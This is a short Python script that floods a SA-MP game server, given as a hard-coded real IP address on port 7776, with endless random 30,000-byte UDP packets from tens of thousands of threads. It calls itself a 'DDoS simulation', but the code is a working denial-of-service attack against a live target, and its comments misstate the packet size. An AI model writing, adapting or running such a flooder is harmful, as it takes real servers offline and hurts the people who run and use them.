import socket
import random
import threading
import time

# Server IP and Port (your SAMP server details)
target_ip = "91.134.166.79"  # Change to your server IP
target_port = 7776  # Default SAMP port

# Packet generation settings
packet_size = 30000  # Size of each packet in bytes (1KB)
threads = 50022  # Number of threads to simulate

# Create a socket object for sending UDP packets
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Function to simulate sending random UDP packets
def flood():
    while True:
        # Randomize the data being sent in the packet
        bytes = random._urandom(packet_size)
        sock.sendto(bytes, (target_ip, target_port))
        print(f"Packet sent to {target_ip}:{target_port}")

# Start flood simulation with multiple threads
def start_attack():
    for i in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()
        time.sleep(0.1)  # Slight delay between starting threads

# Run the DDoS simulation
if __name__ == "__main__":
    print(f"Starting DDoS simulation on {target_ip}:{target_port}")
    start_attack()
